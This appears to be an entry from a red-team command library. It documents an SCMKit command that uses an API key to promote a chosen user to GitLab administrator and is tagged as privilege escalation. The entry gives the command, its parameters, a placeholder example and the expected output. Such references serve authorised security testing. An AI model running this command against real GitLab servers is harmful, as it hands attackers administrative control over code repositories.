---
id: 89ee9e89-1213-4b73-a49c-777211913df9
name: scmkit-add-gitlab-admin-api-key
type: command
executor: bash
data: >-
  SCMKit.exe -s gitlab -m addadmin -c $_API_KEY -u $_GITLAB_URL -o
  $_TARGET_USERNAME
output: null
created_at: '2023-04-06T03:56:25.112852+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - privilege-escalation
verified: true
validated: true
---

# scmkit-add-gitlab-admin-api-key

## Command

```bash
SCMKit.exe -s gitlab -m addadmin -c $_API_KEY -u $_GITLAB_URL -o $_TARGET_USERNAME
```

## Description

Promotes a user to admin using API key.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -m addadmin | Add admin mode | Yes |
| -o $_TARGET_USERNAME | Username to promote | Yes |

## Examples

```bash
SCMKit.exe -s gitlab -m addadmin -c glpat-abc -u https://gitlab.example.com -o targetuser
```

## Expected Output

Success message: User promoted.

## Related

- [[procedures/GitLab-Repository-Enumeration-and-Search]]
